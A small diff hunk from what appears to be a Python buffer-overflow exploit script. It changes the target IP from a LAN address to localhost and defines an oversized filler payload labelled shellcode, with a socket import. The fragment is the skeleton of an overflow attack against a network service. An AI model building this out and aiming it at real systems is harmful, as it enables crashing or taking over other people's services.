@@ -3,7 +3,7 @@
 import socket
 
 
-TARGET_IP                    =    "192.168.1.65"
+TARGET_IP                    =    "127.0.0.1"
 
 shellcode  = "\x41\x42" + "\x43" * 4381 + "\x70" * 2000
 
